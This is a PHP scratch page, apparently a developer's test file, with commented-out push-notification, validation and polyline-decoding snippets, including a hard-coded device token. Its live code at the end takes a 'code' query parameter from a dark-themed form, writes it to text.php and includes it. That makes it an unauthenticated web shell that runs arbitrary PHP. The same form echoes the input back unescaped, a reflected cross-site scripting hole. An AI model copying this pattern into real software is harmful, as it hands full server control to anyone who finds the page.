<body>
<pre>
    <?php

    //require_once "push_alert.php";

    // iOSPush('dRWpQ0kVWrQ:APA91bHN12VGCnv8MLF-UmXcWmSp3r5-24csa98sQSLDDqYIKwgbxZ-5LN8JFQOMMwrufcJiLDT99MJeqfWnT1JVLoLo16BMY4HUYI9VgGzeF1AAGRTRStcqqSZHiIxNYLElnKmuRKoM',[
    //     'title'=>"jjjj",
    //     'body'=>"jjjj",
    //     'trip_id'=>"7",
    //     'ride_id'=>"7",

    // ]);

    /* require('vendor/autoload.php');

use Rakit\Validation\Validator;

$validator = new Validator;
$validation = $validator->make([
    'name'=>"Israel Alagbe",
    'age'=>18,
    'father'=>['age'=>40],
    'email'=>'isra@jjd.com'
], [
    'name'=>'required',
    'age'=>'required|numeric|min:18',
    'father.age'=>'required|min:18',
    'email'=>'email'
]);
$validation->validate();
if ($validation->fails()) {
    // handling errors
    $errors = $validation->errors();
    echo "<pre>";
    print_r($errors->all()[0]);
    echo "</pre>";
    exit;
} else {
    // validation passes
    echo "Success!";
} */



    //var_dump(\GeometryLibrary\PolyUtil::decode("e}fg@ixjSM@C?C?A?A?AAAAA?ACAA?ECEAOAMGeA??Eq@E}@A[?W??AMy@G]@YBWB]FoBJ??Cg@C_@C[Io@EQEQCMIUM]Uc@Yc@yA_C??BE@ABC@A?C@A@C?C@A?CACAE?CACAECCACACAAC?AAA?A?A?C?A?A?A?GKEGEIa@w@Ua@MSMSc@i@e@k@c@a@g@_@y@g@q@YQGYKSG_AUGAwAc@c@MeA[e@O[I]IOESESIeA]c@M_@OYKi@YWQm@a@USMI}@w@{AwAsAuAGEcF}EIGGGmBqBoB{Bq@u@k@aA??@A?A@A?A?A@A?A@A?K?CACAE?CCCACCAIIUE{@y@]]aA}Bo@sAeAmB}@qA}@gAe@e@kAq@]Uc@Yc@Wo@[_@QgJkEwAy@gAo@YSQM_Au@qAoAcAgAc@g@W[m@o@W_@EGWc@??@G@K?EAGEIi@iAo@}AHYNMLILQLAH?DH??CD??`@d@FHLNNVRZ??n@i@??PXPVRXNN@@?@?@?@KH??LN"));
    require 'vendor/autoload.php';
    if (@$_GET['code']) {
        file_put_contents('text.php',"<?php ".@$_GET['code']);
        include "text.php";
    }

    ?>
    </pre>
    <style>
        body{
            background-color:black;
            color:white;
        }
    </style>
    <form action='' method='GET'>
        <textarea name='code' width='500' height=500 rows=20 cols=100 ><?= @$_GET['code'] ?></textarea>
        <button type='submit'>Submit</button>
    </form>

</body> 